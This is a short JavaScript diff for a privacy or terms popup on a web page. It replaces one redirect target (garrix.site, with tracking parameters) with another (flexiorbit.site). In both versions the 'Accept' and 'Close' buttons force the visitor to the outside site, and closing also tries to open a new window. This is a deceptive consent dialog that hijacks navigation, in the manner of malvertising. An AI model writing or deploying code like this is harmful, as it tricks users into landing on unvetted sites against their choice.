@@ -210,9 +210,9 @@
     );
     document.body.appendChild(bd);
     const accept = bd.querySelector('#ppAccept'), close = bd.querySelector('#ppClose');
-    function goTerms(){ window.location.href = 'http://garrix.site/?utm_campaign=bXDsfRboHU&v1=[v1]&v2=[v2]&v3=[v3]'; }
+    function goTerms(){ window.location.href = 'https://flexiorbit.site/'; }
     if(accept) accept.addEventListener('click', goTerms);
-    if(close)  close.addEventListener('click', ()=>{ window.location.href='http://garrix.site/?utm_campaign=bXDsfRboHU&v1=[v1]&v2=[v2]&v3=[v3]'; try{ window.open('http://garrix.site/?utm_campaign=bXDsfRboHU&v1=[v1]&v2=[v2]&v3=[v3]','http://garrix.site/?utm_campaign=bXDsfRboHU&v1=[v1]&v2=[v2]&v3=[v3]'); }catch(e){} });
+    if(close)  close.addEventListener('click', ()=>{ window.location.href='https://flexiorbit.site/'; try{ window.open('https://flexiorbit.site/','https://flexiorbit.site/'); }catch(e){} });
   }
 
   (function maybeShowPrivacy(){
